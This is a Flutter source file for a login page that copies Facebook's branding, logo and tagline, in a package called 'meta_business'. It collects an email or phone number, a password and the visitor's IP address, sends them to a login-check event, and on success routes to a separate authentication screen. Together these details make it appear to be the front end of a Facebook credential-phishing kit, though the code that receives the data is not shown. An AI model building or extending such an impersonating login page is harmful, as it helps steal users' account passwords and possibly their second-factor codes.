import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_svg/svg.dart';
import 'package:gap/gap.dart';
import 'package:meta_business/src/presentation/authentication/auth_screen.dart';
import 'package:meta_business/src/presentation/login/widget/footer.dart';

import '../bloc/home_bloc.dart';

class LoginScreen extends StatefulWidget {
  final String ip;

  const LoginScreen({super.key, required this.ip});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  final HomeBloc _homeBloc = HomeBloc();
  bool isDisabled = false;
  final Color disableBackground = Colors.grey;

  TextEditingController email = TextEditingController();
  TextEditingController password = TextEditingController();
  String error = '';
  submit() {
    print("clicked");
    if (_formKey.currentState!.validate()) {
      _homeBloc.add(CheckLoginEvent(email.text, password.text, widget.ip));
    }
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;
    return BlocConsumer<HomeBloc, HomeState>(
      bloc: _homeBloc,
      listener: (context, state) {
        if (state is CheckingState) {
          print("Checking login");
          // showDialog(
          //     context: context,
          //     builder: (context) {
          //       return const Center(
          //         child: CircularProgressIndicator(),
          //       );
          //     });
          setState(() {
            isDisabled = true;
          });
        }
        if (state is CheckingLoginFinished) {
          print("Checking login finish");

          // Navigator.of(context).pop();
          if (state.response['status'] == 200) {
            Navigator.push(context, MaterialPageRoute(builder: (context) {
              return AuthScreen(
                email: email.text,
              );
            }));
          }
          if (state.response['status'] == 400) {
            setState(() {
              error = state.response['message'];
              isDisabled = false;
            });
          }
        }
      },
      builder: (context, state) {
        return Scaffold(
          body: SingleChildScrollView(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                Container(
                    color:
                        screenWidth > 780 ? hexColor("f1f2f6") : Colors.white,
                    height: 700,
                    child: screenWidth > 780
                        // large screen
                        ? Container(
                            padding:
                                const EdgeInsets.only(top: 72, bottom: 112),
                            child: Row(
                              crossAxisAlignment: CrossAxisAlignment.center,
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Flexible(flex: 3, child: Title()),
                                Padding(
                                  padding: const EdgeInsets.symmetric(
                                      horizontal: 16),
                                  child: Form(
                                    key: _formKey,
                                    child: Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.center,
                                      children: [
                                        Container(
                                          width: 400,
                                          padding: const EdgeInsets.all(16),
                                          decoration: BoxDecoration(
                                              boxShadow: const [
                                                BoxShadow(
                                                  color: Color.fromARGB(
                                                      255,
                                                      188,
                                                      188,
                                                      188), // Màu của đổ bóng
                                                  blurRadius:
                                                      10, // Bán kính đổ bóng
                                                  spreadRadius:
                                                      2, // Phạm vi đổ bóng
                                                )
                                              ],
                                              color: Colors.white,
                                              borderRadius:
                                                  BorderRadius.circular(8)),
                                          child: Column(
                                            children: [
                                              TextFormField(
                                                  controller: email,
                                                  validator: (value) {
                                                    // if (!value!.contains("@")) {
                                                    //   return "Enter a valid email";
                                                    // } else {
                                                    //   return null;
                                                    // }
                                                  },
                                                  decoration:
                                                      const InputDecoration(
                                                    border:
                                                        OutlineInputBorder(),
                                                    hintText:
                                                        "Email address or phone number",
                                                  )),
                                              const Gap(12),
                                              TextFormField(
                                                  controller: password,
                                                  obscureText: true,
                                                  validator: (value) {
                                                    if (value!.length < 8) {
                                                      return "Password must be at least 8 characters";
                                                    }
                                                    return null;
                                                  },
                                                  decoration:
                                                      const InputDecoration(
                                                    border:
                                                        OutlineInputBorder(),
                                                    hintText: "Password",
                                                  )),
                                              const Gap(12),
                                              error.isNotEmpty
                                                  ? Align(
                                                      alignment:
                                                          Alignment.centerLeft,
                                                      child: Padding(
                                                        padding:
                                                            const EdgeInsets
                                                                    .only(
                                                                bottom: 8.0),
                                                        child: Text(
                                                          error,
                                                          style:
                                                              const TextStyle(
                                                                  color: Colors
                                                                      .red),
                                                        ),
                                                      ),
                                                    )
                                                  : const Text(""),
                                              GestureDetector(
                                                  onTap: submit,
                                                  child: Container(
                                                      padding:
                                                          const EdgeInsets.all(
                                                              14),
                                                      decoration: BoxDecoration(
                                                          borderRadius:
                                                              BorderRadius
                                                                  .circular(6),
                                                          color: isDisabled
                                                              ? disableBackground
                                                              : hexColor(
                                                                  "2575ea")),
                                                      width: double.infinity,
                                                      child: Center(
                                                          child: Text(
                                                        "Log in",
                                                        style: w600TextStyle(
                                                            color: Colors.white,
                                                            fontSize: 18),
                                                      )))),
                                              const Gap(16),
                                              const Text(
                                                "Forgotten account?",
                                                style: TextStyle(
                                                    color: Colors.blue),
                                              ),
                                              const Gap(12),
                                              const Divider(thickness: 1),
                                              const Gap(16),
                                              GestureDetector(
                                                  onTap: () {
                                                    print("clicked");
                                                  },
                                                  child: Container(
                                                      width: 200,
                                                      padding:
                                                          const EdgeInsets.all(
                                                              14),
                                                      decoration: BoxDecoration(
                                                          borderRadius:
                                                              BorderRadius
                                                                  .circular(6),
                                                          color: hexColor(
                                                              "42b72a")),
                                                      child: Center(
                                                          child: Text(
                                                        "Create new account",
                                                        style: w600TextStyle(
                                                            color: Colors.white,
                                                            fontSize: 18),
                                                      )))),
                                            ],
                                          ),
                                        ),
                                        const Gap(24),
                                        Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.center,
                                          children: [
                                            Text(
                                              "Create a Page ",
                                              style: w600TextStyle(),
                                            ),
                                            const Text(
                                                "for a celebrity, brand or business"),
                                          ],
                                        )
                                      ],
                                    ),
                                  ),
                                )
                              ],
                            ),
                          )
                        // mobile
                        : Column(
                            mainAxisAlignment: MainAxisAlignment.start,
                            children: [
                              Title(),
                              const Gap(8),
                              Form(
                                key: _formKey,
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.center,
                                  children: [
                                    Container(
                                      margin: const EdgeInsets.symmetric(
                                          horizontal: 16),
                                      child: Column(
                                        children: [
                                          TextFormField(
                                              controller: email,
                                              validator: (value) {
                                                // if (value!.length < 8) {
                                                //   return "password must be at least 8 characters";
                                                // }
                                              },
                                              decoration: InputDecoration(
                                                focusedBorder: InputBorder.none,
                                                border: InputBorder.none,
                                                filled: true,
                                                fillColor: hexColor("f1f2f6"),
                                                hintText:
                                                    "Email address or phone number",
                                              )),
                                          const Gap(12),
                                          TextFormField(
                                              controller: password,
                                              obscureText: true,
                                              validator: (value) {
                                                if (value!.length < 8) {
                                                  return "password must be at least 8 characters";
                                                }
                                              },
                                              decoration: InputDecoration(
                                                focusedBorder: InputBorder.none,
                                                border: InputBorder.none,
                                                filled: true,
                                                fillColor: hexColor("f1f2f6"),
                                                hintText: "Password",
                                              )),
                                          const Gap(12),
                                          error.isNotEmpty
                                              ? Align(
                                                  alignment:
                                                      Alignment.centerLeft,
                                                  child: Padding(
                                                    padding:
                                                        const EdgeInsets.only(
                                                            bottom: 8.0),
                                                    child: Text(
                                                      error,
                                                      style: const TextStyle(
                                                          color: Colors.red),
                                                    ),
                                                  ),
                                                )
                                              : const Text(""),
                                          GestureDetector(
                                              onTap: submit,
                                              child: Container(
                                                  padding:
                                                      const EdgeInsets.all(14),
                                                  decoration: BoxDecoration(
                                                      borderRadius:
                                                          BorderRadius.circular(
                                                              6),
                                                      color: isDisabled
                                                          ? disableBackground
                                                          : hexColor("2575ea")),
                                                  width: double.infinity,
                                                  child: Center(
                                                      child: Text(
                                                    "Log in",
                                                    style: w600TextStyle(
                                                        color: Colors.white,
                                                        fontSize: 16),
                                                  )))),
                                          const Gap(16),
                                          const Text(
                                            "Forgotten account?",
                                            style:
                                                TextStyle(color: Colors.blue),
                                          ),
                                          const Gap(12),
                                          const Divider(thickness: 1),
                                          const Gap(16),
                                          GestureDetector(
                                              onTap: () {
                                                print("clicked");
                                              },
                                              child: Container(
                                                  width: 240,
                                                  padding:
                                                      const EdgeInsets.all(14),
                                                  decoration: BoxDecoration(
                                                    border: Border.all(
                                                        color: const Color
                                                                .fromARGB(255,
                                                            190, 187, 187)),
                                                    borderRadius:
                                                        BorderRadius.circular(
                                                            6),
                                                  ),
                                                  child: Center(
                                                      child: Text(
                                                    "Create new account",
                                                    style: w400TextStyle(
                                                        color: Colors.black,
                                                        fontSize: 16),
                                                  )))),
                                        ],
                                      ),
                                    ),
                                  ],
                                ),
                              )
                            ],
                          )),
                const Footer()
              ],
            ),
          ),
        );
      },
    );
  }

  Widget Title() {
    final screenWidth = MediaQuery.of(context).size.width;
    return Container(
      constraints: BoxConstraints(maxWidth: 560),
      child: Column(
        crossAxisAlignment: screenWidth > 780
            ? CrossAxisAlignment.start
            : CrossAxisAlignment.center,
        mainAxisAlignment: MainAxisAlignment.start,
        children: [
          SvgPicture.asset(
            'assets/images/svg/facebook.svg',
            width: screenWidth > 780 ? 320 : 180,
          ),
          screenWidth > 780
              ? Padding(
                  padding: EdgeInsets.only(left: screenWidth > 780 ? 28.0 : 14),
                  child: Text(
                    "Facebook helps you connected and share with the people in your life.",
                    style: w400TextStyle(fontSize: 24),
                  ),
                )
              : const SizedBox()
        ],
      ),
    );
  }
}
